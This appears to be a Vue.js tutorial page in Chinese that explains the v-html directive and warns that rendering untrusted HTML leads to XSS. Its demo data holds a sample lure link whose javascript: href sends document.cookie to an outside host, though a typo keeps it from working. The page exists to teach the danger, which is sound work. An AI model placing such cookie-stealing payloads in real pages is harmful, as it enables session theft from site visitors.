<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v-text指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>

        <!--
           v-html指令:
              1、作用:向指定节点中渲染包含html结构的内容
              2、与插值语法的区别:
                    (1).v-html会替换掉节点中所有的内容,{{xx}}则不会
                    (2).v-html可以识别htmL结构
              3、严重注意:v-html有安全性问题
                    (1).在网站上动态渲染任意html是非常危险的,容易导致xss攻击
                    (2).一定要在可信的内容上使用v-html,永不要用在用户提交的内容上
         -->

        <!--准备好一个容器-->
        <div id="root" align="center">
            <div>{{name}}</div>
            <div v-html="str"></div>
        </div>

<script type="text/javascript">
    //阻止 vue 在启动时生成生产提示
    Vue.config.productionTip = false
    new Vue({
        el: "#root",
        data: {
            name: "Morries_wu",
            str:'<a href=javascript:localtion.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了,快来</a>'
        }


    });
</script>

</body>
</html>
